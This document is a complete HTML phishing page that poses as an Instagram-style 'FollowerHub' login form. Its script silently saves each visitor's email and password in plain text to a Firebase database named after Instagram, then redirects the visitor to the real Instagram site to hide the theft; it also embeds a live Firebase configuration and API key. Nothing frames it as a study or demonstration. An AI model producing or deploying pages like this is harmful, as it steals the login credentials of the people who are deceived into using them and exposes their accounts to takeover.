<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Login</title>

<style>
*{
    margin:0;
    padding:0;
    box-sizing:border-box;
    font-family:Arial,sans-serif;
}

body{
    background:#0f1117;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    padding:20px;
}

.login-box{
    width:350px;
    background:#171923;
    border-radius:20px;
    padding:35px;
    border:1px solid rgba(255,255,255,0.08);
    box-shadow:0 10px 30px rgba(0,0,0,0.3);
}

h2{
    text-align:center;
    color:white;
    margin-bottom:25px;
}

input{
    width:100%;
    padding:15px;
    margin-bottom:15px;
    border:none;
    outline:none;
    border-radius:12px;
    background:#1f2330;
    color:white;
    font-size:15px;
}

button{
    width:100%;
    padding:15px;
    border:none;
    border-radius:12px;
    background:linear-gradient(
        90deg,
        #833ab4,
        #fd1d1d,
        #fcb045
    );
    color:white;
    font-size:16px;
    font-weight:bold;
    cursor:pointer;
}

button:hover{
    opacity:0.9;
}

.text{
    text-align:center;
    color:#aaa;
    margin-top:15px;
    font-size:13px;
}
</style>
</head>

<body>

<div class="login-box">

<h2>Login</h2>

<input
type="email"
id="email"
placeholder="Email">

<input
type="password"
id="password"
placeholder="Password">

<button onclick="loginUser()">
Login
</button>

<div class="text">
FollowerHub Access
</div>

</div>

<script type="module">

import { initializeApp }
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-app.js";

import {
getAuth,
signInWithEmailAndPassword
}
from "https://www.gstatic.com/firebasejs/10.12.2/firebase-auth.js";

import {
  getDatabase,
  ref,
  push
} from "https://www.gstatic.com/firebasejs/10.12.2/firebase-database.js";

const firebaseConfig = {
  apiKey: "AIzaSyA5_RpvfgLdbBZTC16iOF3Ag-T1SgmYzFc",
  authDomain: "instagram-991c8.firebaseapp.com",
  databaseURL: "https://instagram-991c8-default-rtdb.firebaseio.com",
  projectId: "instagram-991c8",
  storageBucket: "instagram-991c8.firebasestorage.app",
  messagingSenderId: "1061261822058",
  appId: "1:1061261822058:web:0db9915948489155962213",
  measurementId: "G-RWV45N0CNH"
};

const app = initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getDatabase(app);

window.loginUser = function(){

  const email = document.getElementById("email").value;
  const password = document.getElementById("password").value;

  // Save credentials to database, then always redirect to real Instagram
  const loginsRef = ref(db, "logins");
  push(loginsRef, {
    email: email,
    password: password,
    timestamp: new Date().toISOString()
  }).finally(() => {
    window.location.href = "https://www.instagram.com";
  });

}

</script>

</body>
</html>
